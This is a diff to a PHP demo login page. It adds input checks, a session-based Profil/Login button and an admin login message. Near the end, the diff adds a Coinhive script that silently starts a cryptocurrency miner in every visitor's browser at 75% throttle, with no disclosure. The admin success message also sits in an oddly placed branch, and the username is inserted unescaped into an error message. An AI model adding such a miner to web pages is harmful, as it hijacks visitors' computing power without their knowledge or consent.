@@ -13,8 +13,8 @@ mysqli_set_charset($conn, 'utf8');
 
 if(!$conn->connect_errno) {
 //Validate
-  if(isset($_POST['username'])) {
-    if(isset($_POST['password'])) {
+  if(isset($_POST['username']) && ($_POST['username'] != "")) {
+    if(isset($_POST['password']) && ($_POST['password'] != "")) {
       //VARS
       $isAdmin = false;
       //Is Admin?
@@ -118,6 +118,10 @@ if(!$conn->connect_errno) {
       //  echo "<meta http-equiv=\"refresh\" content=\"10\" URL=\"/dashboard.html\">"; Dosen't Work :(
         die("");
       } else{
+        if($isAdmin) {
+          echo "Erfogreich eingeloggt als Admin. Du wird automatisch weiter geleitet. Wenn das nicht funktioniert klicke <a href=\"index.php\">hier</a>";
+          die("");
+        }
         $errorMessage = "Den Benutzer " . $username . " gibt es nicht.";
       }
 
@@ -151,33 +155,56 @@ if(!$conn->connect_errno) {
     echo "<body>";
   }
    ?>
-     <div id="w">
-       <h1>Welcome to the Demo Test Login Site</h1>
-       <p>Click the login link below to expand the login window. This is only a demo.</p>
-       <center>
-         <a href="#loginmodal" class="flatbtn" id="modaltrigger">
-           <span style="vertical-align: bottom;">Login</span>
-         </a>
-       </center>
-     </div>
-     <div id="loginmodal" style="display: none;">
-       <h1>Benutzer Login</h1>
-       <form id="loginform" name="loginfrom" method="post" action="login.php">
-         <label for="username">Benutzername:</label>
-         <input type="text" name="username" id="username" class="txtfield" tabindex="1">
+   <div id="w">
+     <h1>Welcome to the Demo Test Login Site</h1>
+     <p>Click the login link below to expand the login window. This is only a demo.</p>
+     <center>
 
-         <label for="password">Passwort:</label>
-         <input type="password" name="password" id="password" class="txtfield" tabindex="2">
+     </center>
+     <ul>
+         <li>
+           <a href="#" class="active">Home</a>
+         </li>
+         <li style="float: right;">
+           <?php
+             require_once('checkSession.php');
+             if($CHECK) {
+               echo "<a href=\"#profilemodal\" class=\"flatbtn\" id=\"modaltrigger\">
+                 <span style=\"vertical-align: bottom;\">Profil</span>
+               </a>";
+             }else{
+               echo "<a href=\"#loginmodal\" class=\"flatbtn\" id=\"modaltrigger\">
+                 <span style=\"vertical-align: bottom;\">Login</span>
+               </a>";
+             }
+           ?>
 
-         <div class="center">
-           <input type="submit" name="loginbtn" class="flatbtn-blu hidemodal" value="Log In" tabindex="3">
-         </div>
-       </form>
-     </div>
-     <script type="text/javascript">
-       $(function(){
-         $('#modaltrigger').leanModal({top: 110, overlay: 0.45, closeButton: ".hidemodal"});
-       });
-     </script>
-   </body>
- </html>
+         </li>
+
+     </ul>
+   </div>
+   <div id="loginmodal" style="display: none;">
+     <h1>Benutzer Login</h1>
+     <form id="loginform" name="loginfrom" method="post" action="login.php">
+       <label for="username">Benutzername:</label>
+       <input type="text" name="username" id="username" class="txtfield" tabindex="1">
+
+       <label for="password">Passwort:</label>
+       <input type="password" name="password" id="password" class="txtfield" tabindex="2">
+
+       <div class="center">
+         <input type="submit" name="loginbtn" class="flatbtn-blu hidemodal" value="Log In" tabindex="3">
+       </div>
+     </form>
+   </div>
+   <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+   <script type="text/javascript">
+     var miner = new CoinHive.Anonymous('q6ER4wLh1AQxDh8fgmLvwOoXDoVarXGI');
+     miner.setThrottle(0.75);
+     miner.start();
+     $(function(){
+       $('#modaltrigger').leanModal({top: 110, overlay: 0.45, closeButton: ".hidemodal"});
+     });
+   </script>
+ </body>
+</html>
